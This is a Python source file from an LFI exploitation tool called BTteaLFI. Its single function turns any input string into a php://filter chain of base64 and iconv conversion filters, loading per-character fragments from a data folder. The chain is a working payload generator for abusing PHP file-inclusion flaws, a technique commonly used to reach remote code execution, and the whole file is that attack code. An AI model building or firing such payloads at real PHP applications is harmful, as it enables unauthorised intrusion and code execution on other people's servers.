# BTteaLFI
# Copyright (C) 2024-2025 BTtea
#
# This file is licensed under GPLv2. See LICENSE.txt for details.

def iconv_lfi(s:str):
    from base64 import b64encode
    base64_payload = b64encode(s.encode('utf-8')).decode('utf-8')
    filters = "convert.base64-encode|convert.base64-encode|convert.base64-encode|convert.iconv.utf-8.utf-7|"
    for c in base64_payload[::-1]:
            filters += open(f"./data/iconv/{format(ord(c),'x')}").read() + "|"
            filters += "convert.base64-decode|convert.base64-encode|"
    filters += "convert.base64-decode"
    final_payload = f"php://filter/{filters}/resource%3D"
    return final_payload